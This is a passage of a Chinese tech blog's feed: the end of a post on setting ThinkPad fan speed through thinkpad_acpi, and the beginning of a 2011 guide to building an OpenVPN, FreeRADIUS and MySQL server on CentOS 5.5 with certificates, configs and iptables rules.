0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面的配置将打开自定义风扇转速的开关。</p><p>这个时候需要重新加载模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">modprobe -r thinkpad_acpi &amp;&amp; modprobe thinkpad_acpi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后再查看下proc里面fan文件的状态：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /proc/acpi/ibm/fan</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此时你会发现，信息有变化。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# cat /proc/acpi/ibm/fan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">status: enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">speed: 5485</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">level: auto</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">commands: level &lt;level&gt; (&lt;level&gt; is 0-7, auto, disengaged, full-speed)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">commands: enable, disable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">commands: watchdog &lt;timeout&gt; (&lt;timeout&gt; is 0 (off), 1-120 (seconds))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后我们就可以通过command来控制风扇的转速啦，auto表示自动，disengaged和full-speed一个效果，也可以设置0-7的等级，0表示停止，感兴趣可以试试，反正我不敢试，</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo "level  full-speed"  &gt; /proc/acpi/ibm/fan</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注意level和full-speed之间只有一个空格..</p><p>再查看fan文件的状态，或者听听风扇转动的声音，你就会发现有明显的变化了，如果模块没有添加fan_control=1的参数的话往/proc/acpi/ibm/fan里面echo信息是不会成功的，会报如下错误：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# echo "level 5" &gt; /proc/acpi/ibm/fan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bash: echo: write error: Invalid argument</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>总结：风扇使劲转起来了，再也不用担心手被烫伤了！</p>]]></content>
        <category label="thinkpad" term="thinkpad"/>
        <category label="fan" term="fan"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[OpenVPN+MySQL环境搭建记录]]></title>
        <id>/2011/09/02/openvpn-mysql-setup</id>
        <link href="https://itxx00.github.io/notes/blog/2011/09/02/openvpn-mysql-setup"/>
        <updated>2011-09-02T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>本文记录了在centos5.5系统中搭建openvpn+mysql+freeradius的过程</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>系统环境：centos5.5</p><p>Eth0：192.168.0.2</p><p>校准系统时间：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ntpdate ntp.api.bz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hwclock -w</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>所需软件包：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum install openssl openssl-devel gcc gcc-c++ mysql mysql-devel mysql-server php php-gd php-devel php-pear php-pear-DB php-mysql php-pdo php-cli php-mbstring php-mcrypt httpd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>下载源码包：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.oberhumer.com/opensource/lzo/download/lzo-2.05.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://swupdate.openvpn.net/community/releases/openvpn-2.2.0.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget ftp://ftp.freeradius.org/pub/freeradius/freeradius-server-2.1.10.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://sourceforge.net/projects/daloradius/files/daloradius/daloradius0.9-9/daloradius-0.9-9-rc1.tar.gz/download</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.nongnu.org/radiusplugin/radiusplugin_v2.1a_beta1.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://sourceforge.net/projects/phpmyadmin/files%2FphpMyAdmin%2F2.11.11.3%2FphpMyAdmin-2.11.11.3-all-languages.tar.bz2/download</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>1.安装lzo-2.0.5  使openvpn支持压缩功能</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf lzo-2.05.tar.gz &amp;&amp;cd lzo-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd ..</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>2.安装openvpn服务</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf openvpn-2.2.0.tar.gz &amp;&amp;cd openvpn-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>复制证书生成所需文件</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir /etc/openvpn &amp;&amp; cp easy-rsa /etc/openvpn -r</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>3.安装radiusplugin</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf radiusplugin_v2.1a_beta1.tar.gz &amp;&amp; cd radiusplugin_*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make #将会生成radiusplugin.so 将其cp到/etc/openvpn目录下</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp radiusplugin.cnf /etc/openvpn/conf/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>4.生成服务端所需证书</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /etc/openvpn/easy-rsa/2.0/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi vars   #编辑变量</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.  vars  #source命令使变量生效</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./clean-all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-ca  #ca.crt ---Root CA证书，用于签发Server和Client证书</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-key-server server #server.crt server.key-创建并签发VPN Server使用的CA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-key client1 #client1.crt client1.key #如果客户端需要使用证书方式认证则需要这个东东，创建客户端证书，一个客户端一个证书</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-key client2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./build-dh  #dh1024.pem--生成Diffie-Hellman文件 ,TLS用到</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">openvpn --genkey --secret keys/ta.key #生成tls auth key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>复制证书文件到配置文件目录</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir /etc/openvpn/conf &amp;&amp; cd keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp ca.crt server.crt server.key dh1024.pem ta.key /etc/openvpn/conf/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tar czf clientkey.tgz ca.crt client1.crt client1.key # 如果客户端使用证书方式认证则这里需要这个东东，本文介绍的radius方式不需要。 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>5.编辑openvpn服务端配置文件</p><p>vi /etc/openvpn/conf/server.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">port 1194</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proto udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dev tap   #TAP设备是一块虚拟的以太网卡，TUN设备是一个虚拟的点到点IP链接。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ca /etc/openvpn/conf/ca.crt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cert /etc/openvpn/conf/server.crt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">key /etc/openvpn/conf/server.key  # This file should be kept secret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dh /etc/openvpn/conf/dh1024.pem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server 10.8.0.0 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifconfig-pool-persist ipp.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push "redirect-gateway def1 bypass-dhcp"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push "dhcp-option DNS 10.8.0.1"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push "dhcp-option DNS 208.67.222.222"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push "dhcp-option DNS 208.67.220.220"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client-to-client</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">keepalive 10 120</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tls-auth /etc/openvpn/conf/ta.key 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comp-lzo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user nobody</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">group nobody</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-tun</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">status openvpn-status.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">verb 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client-to-client #如果让Client之间可以相互看见，去掉本行的注释掉，否则Client之间无法相互访问</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;duplicate-cn  #是否允许一个User同时登录多次，去掉本行注释后可以使用同一个用户名登录多次</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client-cert-not-required #客户端不使用CA证书验证</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username-as-common-name #使用客户提供的UserName作为Common Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;max-clients 1000  #最大连接数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">plugin /etc/openvpn/radiusplugin.so /etc/openvpn/conf/radiusplugin.cnf #radius插件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">script-security 3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>编辑radius插件配置文件</p><p>vi /etc/openvpn/conf/radiusplugin.cnf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">NAS-Identifier=OpenVpn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service-Type=5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Framed-Protocol=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAS-Port-Type=5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAS-IP-Address=127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OpenVPNConfig=/etc/openvpn/conf/server.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">subnet=255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwriteccfiles=true</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nonfatalaccounting=false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The UDP port for radius accounting.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acctport=1813</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The UDP port for radius authentication.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        authport=1812</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The name or ip address of the radius server.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        name=127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # How many times should the plugin send the if there is no response?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        retry=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # How long should the plugin wait for a response?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        wait=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # The shared secret.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sharedsecret=testpw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动openvpn</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/sbin/openvpn  --cd /etc/openvpn \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> --config /etc/openvpn/conf/server.conf &amp;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置内核路由转发和iptables</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sysctl -w net.ipv4.ip_forward=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A INPUT -p udp  --dport 1194 -j ACCEPT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 